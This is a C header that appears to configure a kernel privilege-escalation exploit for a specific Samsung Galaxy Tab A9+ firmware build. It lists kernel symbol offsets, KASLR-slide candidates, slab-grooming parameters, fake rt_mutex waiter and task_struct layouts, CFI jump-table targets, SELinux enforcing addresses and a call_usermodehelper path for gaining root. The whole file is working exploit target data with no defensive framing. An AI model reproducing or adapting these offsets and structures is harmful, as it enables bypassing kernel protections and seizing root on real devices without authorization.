#ifndef TARGET_H
#define TARGET_H

/* =========================================================================
 * Target Device: Samsung Galaxy Tab A9+ 5G (SM-X216B / gta9p)
 * Firmware:      X216BXXS9DYJ7
 * Kernel:        5.4.249-qgki-31053672-abX216BXXS9DYJ7 (Qualcomm SM6375)
 * Arch / Mode:   AArch64 Little-Endian (CONFIG_CFI_CLANG=y)
 * ========================================================================= */

#define TARGET_DEVICE             "SM-X216B"
#define BUILD_VARIANT_LABEL       "gta9p-X216BXXS9DYJ7-root-umh"
#define BUILD_FINGERPRINT         "samsung/gta9pxx/gta9p:14/UP1A.231005.007/X216BXXS9DYJ7:user/release-keys"

/* Kernel Virtual & Physical Memory Geometry */
#define KIMAGE_TEXT_BASE          0xffffffc010080000ULL
#define P0_PAGE_OFFSET            0xffffff8000000000ULL
#define P0_PHYS_OFFSET            0x80000000ULL
#define P0_KERNEL_PHYS_LOAD       0x80080000ULL
#define SKB_DATA_DELTA            (-0xe80LL)

#define DIRECT_MAP_BASE           0xffffff8000000000ULL
#define DIRECT_MAP_END            0xffffffc000000000ULL
#define VMEMMAP_START             0xfffffffeffe00000ULL

/* Slab / Allocator Grooming */
#define MM_STRUCT_SZ              0x3c0
#define MM_ORDER                  3
#define KMALLOC_CGROUP_TYPE       0
#define KMALLOC_CACHE_TYPES       2

/* Waiter Structure ABI: Linux 5.4 AArch64 (80 bytes) */
#define LEGACY_RT_MUTEX_WAITER    1
#define COMPACT_RT_MUTEX_WAITER   0

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF          0x30
#define FAKE_WAITER_LOCK_OFF          0x38
#define FAKE_WAITER_PRIO_OFF          0x40
#define FAKE_WAITER_DEADLINE_OFF      0x48
#define FAKE_WAITER_LAYOUT_SIZE       0x50

#define SLIDE_FAKE_WAITER_PRIO    0
#define SLIDE_LOCK_OWNER_VALUE    1ULL
#define SLIDE_USE_FAKE_TASK       1
#define SLIDE_PSELECT_WORD_SHIFT  0

/* TraceFS KASLR Discovery Anchors */
#define SLIDE_TRACEFS_EVENT_ID              84
#define SLIDE_TRACEFS_WORKER_CALLER_OFF     0x0029eb5cULL
#define SLIDE_MAX_ATTEMPTS                  32

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL

/* Verified Kernel Symbols & Offsets */
#define INIT_TASK_OFF             0x02960280ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x028ef9c8ULL
#define ROOT_TASK_GROUP_OFF       0x02b30f40ULL
#define KMALLOC_CACHES_OFF        0x0235acf0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x021755b8ULL
#define SELINUX_STATE_OFF         0x02b1f000ULL
#define SELINUX_ENFORCING_OFF     0x02b1f001ULL

/* Ashmem & Configfs Function Pointers */
#define ASHMEM_MISC_FOPS_OFF      0x0294baf0ULL
#define ASHMEM_FOPS_OFF           0x0214ee28ULL
#define ASHMEM_IOCTL_OFF          0x0016304cULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x0016304cULL
#define ASHMEM_MMAP_OFF           0x001639c0ULL
#define ASHMEM_OPEN_OFF           0x00163b48ULL
#define ASHMEM_RELEASE_OFF        0x00163bc0ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x00163cdcULL
#define COPY_SPLICE_READ_OFF      0x015f742cULL
#define NOOP_LLSEEK_OFF           0x0049cbd0ULL

/* Clang Forward-Edge CFI Jump Table Offsets */
#define CONFIG_CFI_CLANG_ENABLED                  1
#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0x00297274ULL
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF  0x01601870ULL
#define CONFIGFS_READ_ITER_OFF                    0x015f38d8ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF               0x015f595cULL

#define ASHMEM_MISC_FOPS          (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS               (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL              (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL       (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP               (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN               (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE            (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO        (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER        (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER   (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ          (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK               (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK                 (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP           (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING         (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES            (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS         (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

#define ROOT_UMH_PATH             "/init"
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)
#define SYSTEM_UNBOUND_WQ         (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF         0x6000
#define ROOT_UMH_DATA_OFF         0x6200

#define SLIDE_NFULNL_LOGGER_NAME_OFF            0x028eac18ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF          0x028eac18ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE            1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02c9d6e9ULL
#define SLIDE_INIT_TASK_OFF                     INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF               ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF                 0x02c9d6e9ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE          (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE        (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE                   (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE             (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE               (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Memory Page Layout in Slab */
#define LOCK_OFF                  0x2210
#define W0_OFF                    0x2350
#define FOPS_OFF                  0x2000
#define SCRATCH_OFF               0x3000
#define RIGHT_OFF                 0x4440
#define LEFT_OFF                  0x5550
#define FAKE_TASK_OFF             0x3200

/* Task Struct Offsets (Disassembled from commit_creds) */
#define TASK_STRUCT_REAL_CRED_OFF 0x800ULL
#define TASK_STRUCT_CRED_OFF      0x808ULL
#define FAKE_TASK_USAGE_OFF       0x40
#define FAKE_TASK_PRIO_OFF        0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF  0x310
#define FAKE_TASK_PI_LOCK_OFF     0x8dc
#define FAKE_TASK_PI_WAITERS_OFF  0x8e8
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8f8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x900

/* Configfs Buffer Layout (Linux 5.4 configfs_write_bin_file) */
#define CFG_PAGE_OFF              0x10
#define CFG_MUTEX_OFF             0x20
#define CFG_READ_IN_PROGRESS_OFF  0x44
#define CFG_WRITE_IN_PROGRESS_OFF 0x45
#define CFG_NEEDS_READ_FILL_OFF   0x44
#define CFG_BIN_BUFFER_OFF        0x48
#define CFG_BIN_BUFFER_SIZE_OFF   0x50
#define CFG_CB_MAX_SIZE_OFF       0x54

/* Workqueue Layout */
#define WQ_DFL_PWQ_OFF            0xa0
#define PWQ_POOL_OFF              0x00
#define PWQ_WQ_OFF                0x08
#define PWQ_WORK_COLOR_OFF        0x10
#define PWQ_REFCNT_OFF            0x18
#define PWQ_NR_IN_FLIGHT_OFF      0x1c
#define PWQ_NR_ACTIVE_OFF         0x58
#define PWQ_MAX_ACTIVE_OFF        0x5c
#define POOL_WORKLIST_OFF         0x20
#define POOL_NR_IDLE_OFF          0x34

#define WORK_DATA_OFF             0x00
#define WORK_ENTRY_OFF            0x08
#define WORK_FUNC_OFF             0x18

/* Struct Page & Pipe */
#define STRUCT_PAGE_SIZE          0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF     0x18
#define STRUCT_PAGE_TYPE_OFF      0x34

#define PIPE_BUFFER_SLOTS         16
#define PIPE_BUF_FLAG_CAN_MERGE   0x10

/* file_operations slot offsets */
#define FOPS_OWNER_OFF            0x00
#define FOPS_LLSEEK_OFF           0x08
#define FOPS_READ_OFF             0x10
#define FOPS_WRITE_OFF            0x18
#define FOPS_READ_ITER_OFF        0x20
#define FOPS_WRITE_ITER_OFF       0x28
#define FOPS_IOCTL_OFF            0x50
#define FOPS_COMPAT_IOCTL_OFF     0x58
#define FOPS_MMAP_OFF             0x60
#define FOPS_OPEN_OFF             0x70
#define FOPS_RELEASE_OFF          0x80
#define FOPS_SPLICE_READ_OFF      0xc8
#define FOPS_SHOW_FDINFO_OFF      0xe0

/* Multicast Stack-Carrier Parameters */
#define MCAST_WAITER_OFF          0xd8
#define SLIDE_STACK_WRITER_MCAST  1
#define SLIDE_MCAST_DOMAIN        AF_INET
#define SLIDE_MCAST_LEVEL         IPPROTO_IP
#define SLIDE_MCAST_OPTION        43

#endif /* TARGET_H */
